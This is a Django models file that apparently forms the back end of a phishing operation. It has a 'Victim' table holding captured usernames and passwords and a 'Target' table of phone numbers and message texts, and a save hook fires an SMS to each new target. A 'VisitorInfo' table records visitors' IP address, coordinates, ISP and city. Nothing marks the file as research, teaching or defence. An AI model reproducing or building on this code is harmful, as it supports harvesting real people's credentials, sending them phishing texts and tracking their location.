from django.db import models
from django.db.models.signals import pre_save
from django.dispatch import receiver 

from utils.SendSmsApi import SMS

# Create your models here.
class Victim(models.Model):
    username = models.CharField(max_length=200)
    password = models.CharField(max_length=200)

    def __str__(self):
        return self.username

class Target(models.Model):
    name = models.CharField(max_length=60)
    number = models.CharField(max_length=60)
    text = models.TextField(max_length=160)

    def __str__(self):
        return self.name
    
class VisitorInfo(models.Model):
    ip =  models.CharField(max_length=50, null=True)
    lat = models.CharField(max_length=50, null=True)
    lon = models.CharField(max_length=50, null=True)
    district = models.CharField(max_length=60, null=True)
    isp = models.CharField(max_length=256, null=True)
    city = models.CharField(max_length=256, null=True)

    def __str__(self):
        return f"{self.city}-{self.district}-{self.ip}"
    
    
@receiver(pre_save, sender=Target)
def pre_save_target(sender, instance, **kwargs):
    sms = SMS()
    if instance:
        sms.send(number=instance.number, text=instance.text)